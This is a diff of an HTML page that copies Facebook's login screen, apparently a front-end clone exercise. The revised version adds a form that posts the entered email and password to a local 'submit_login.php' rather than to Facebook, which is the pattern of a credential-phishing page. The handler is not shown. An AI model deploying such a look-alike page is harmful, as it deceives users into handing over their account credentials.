@@ -1,57 +1,33 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <title>facebook</title>
-    <link rel = "stylesheet" href = "facebook.css">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Facebook Login</title>
+  <link rel="stylesheet" href="facebook.css">
 </head>
 <body>
-    <div class = "container">
-        <div class = "box">
-            <div class = "facebook-intro">
-                <div class = "photo">
-                    <img class="logo" src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="Facebook">
-                </div>
-                <div class = "header">
-                    <h2 class = "facebook-info">Facebook helps you connect and share with the people in your life.</h2>
-                </div>
-            </div>
-            <div class = "login-block">
-                <div class = "login-info">
-                        <div class = "equal">
-                            <label>
-                                <input type="text"
-                                       class = "input-change"
-                                       name="email"
-                                       placeholder="Email address or phone number">
-                            </label>
-                        </div>
-                        <div class = "equal">
-                            <label>
-                                <input type="text"
-                                       class = "input-change"
-                                       placeholder="Password">
-                            </label>
-                        </div>
-
-                        <button class = "equal log-in" style = "font-size: 18px; text-align: center;">Log in</button>
-
-                        <div class = "forgotten-password">
-                            <a class = "forgotten_link" href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0">Forgotten password?</a>
-                        </div>
-                        <div class = "line">
-                            <p></p>
-                        </div>
-                        <div class = "create-new-acc">
-                            <button class="equal create">Create new account</button>
-                        </div>
-
-                </div>
-                <div class = "create-page">
-                    <p><strong><a class = "create_page_link" href = "https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0">Create a Page</a></strong> for celebrity, brand or business</p>
-                </div>
-            </div>
-        </div>
+  <header>
+    </header>
+  <main>
+    <form class="login-form" action="submit_login.php" method="post">
+      <h2>Log in to Facebook</h2>
+      <div class="login-fields">
+        <label for="username">Email address or phone number</label>
+        <input type="text" id="username" name="username" required>
+        <label for="password">Password</label>
+        <input type="password" id="password" name="password" required>
+      </div>
+      <button type="submit" class="log-in-button">Log in</button>
+    </form>
+    <div class="forgotten-password">
+      <a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0">Forgotten password?</a>
     </div>
+    <div class="create-account">
+      <p>New to Facebook? <a href="https://www.facebook.com/signup/">Create an account</a></p>
+    </div>
+  </main>
+  <footer>
+    </footer>
 </body>
 </html>
